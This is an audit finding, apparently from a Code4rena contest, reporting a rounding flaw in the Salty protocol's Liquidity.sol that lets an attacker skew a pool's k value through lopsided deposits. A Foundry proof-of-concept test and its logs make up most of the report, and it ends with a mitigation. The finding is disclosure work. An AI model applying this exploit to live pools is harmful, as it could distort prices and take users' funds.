## Adding reserves with a large disproportion can lead to subsequent *k* manipulation due to rounding errors 
**Github:**  [Liquidity.sol:l146](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/Liquidity.sol#L146)

### Vulnerability details:
Calling depositLiquidityAndIncreaseShare() with values that differs more than 1e26,  for example 1000 and 10e26, for reserve0 and reserve1 will lead to the situation when subsequent calls of depositLiquidityAndIncreaseShare() with values up to 10e23 for both reserve0 and reserve1 will add 10e23 liquidity to reserve1 and 0 to reserve0. 

This allows attacker influence manipulate k value by adding liquidity only to reserve1 in the loop. 

Subsequent swaps will be calculated with manipulated k.

### POC 
```javascript
function testMultipleInteractions() public {
    vm.startPrank(address(collateralAndLiquidity));

    IERC20 token0 = new TestERC20("TEST", 18);
    IERC20 token1 = new TestERC20("TEST", 18);
    vm.stopPrank();

    vm.prank(address(dao));
    poolsConfig.whitelistPool(pools, token0, token1);

    vm.startPrank(address(collateralAndLiquidity));

    token0.transfer(
        alice,
        token0.balanceOf(address(collateralAndLiquidity))
    );

    token1.transfer(
        alice,
        token1.balanceOf(address(collateralAndLiquidity))
    );

    vm.stopPrank();

    vm.startPrank(alice);
    token0.approve(address(collateralAndLiquidity), type(uint256).max);
    token1.approve(address(collateralAndLiquidity), type(uint256).max);
    token0.approve(address(pools), type(uint256).max);
    token1.approve(address(pools), type(uint256).max);
    vm.stopPrank();

    vm.startPrank(bob);
    token0.approve(address(collateralAndLiquidity), type(uint256).max);
    token1.approve(address(collateralAndLiquidity), type(uint256).max);
    token0.approve(address(pools), type(uint256).max);
    token1.approve(address(pools), type(uint256).max);
    vm.stopPrank();

    bytes32 poolID = PoolUtils._poolID(token0, token1);
    {
        vm.startPrank(alice);

        token0.transfer(bob, 10 ** 27);
        token1.transfer(bob, 10 ** 27);

        collateralAndLiquidity.depositLiquidityAndIncreaseShare(
            token0,
            token1,
            1000,
            10 ** 26, //should be >=  10 ** 26
            0,
            block.timestamp,
            false
        );

        vm.warp(block.timestamp + 1 hours);
        vm.stopPrank();
        (uint reserve0middle, uint reserve1middle) = pools.getPoolReserves(
            token0,
            token1
        );

        console2.log(
            "1. k is ",
            (reserve0middle * reserve1middle + 5 * 10 ** 21) / 10 ** 22
        );

        vm.startPrank(bob);
        for (uint i; i < 100; ++i) {
            collateralAndLiquidity.depositLiquidityAndIncreaseShare(
                token0,
                token1,
                10 ** 23, // < 10 ** 23
                10 ** 23, // < 10 ** 23
                0,
                block.timestamp,
                false
            );
            vm.warp(block.timestamp + 1 hours);
        }

        (uint reserve0k3, uint reserve1k3) = pools.getPoolReserves(
            token0,
            token1
        );
        console2.log(
            "2. k is ",
            (reserve0k3 * reserve1k3 + 5 * 10 ** 21) / 10 ** 22
        );

        vm.startPrank(address(bob));
        token1.approve(address(pools), type(uint256).max);
        token0.approve(address(pools), type(uint256).max);

        pools.depositSwapWithdraw(
            token0,
            token1,
            10 ** 23,
            0,
            block.timestamp + 1 minutes
        );

        pools.depositSwapWithdraw(
            token1,
            token0,
            10 ** 23,
            0,
            block.timestamp + 1 minutes
        );

        (uint reserve0after2swap, uint reserve1after2swap) = pools
            .getPoolReserves(token0, token1);
        console2.log(
            "3. k after swap is",
            (reserve0after2swap * reserve1after2swap + 5 * 10 ** 21) /
            10 ** 22
        );
    }
}
```
which resulted in 

```logs
Logs:
  1. k is  10000000
  2. k is  12100000
  3. k after swap is 12100000
```

### Mitigation steps

Despite considering this scenario as low probability one, recommend to make it almost impossible by increasing [PoolsUtils.sol:DUST](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/PoolUtils.sol#L13) value to 1e6 instead of 100.